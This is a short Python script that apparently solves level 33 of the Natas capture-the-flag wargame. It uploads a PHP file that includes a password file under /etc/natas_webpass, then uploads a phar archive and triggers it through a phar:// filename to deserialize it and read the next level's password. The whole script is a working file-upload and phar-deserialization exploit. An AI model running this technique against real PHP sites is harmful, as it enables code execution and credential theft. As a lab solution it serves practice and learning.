import config
import os, re, base64
from requests import *
from urllib import quote

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

os.system("php natas33.php")

response = post(url, auth=(user, password), data={"filename": "pwn.php"},
					files={"uploadedfile":("pwn.php", "<?php include(\"/etc/natas_webpass/natas34\"); ?>")})

response = post(url, auth=(user, password), data={"filename": "pwn.phar"},
					files={"uploadedfile": open("natas33.phar", "rb")})

response = post(url, auth=(user, password), data={"filename": "phar://pwn.phar/pwn.txt"},
					files={"uploadedfile": open("natas33.phar", "rb")})

password = re.findall(r"\w{32}", response.content)[-1]

print(password)
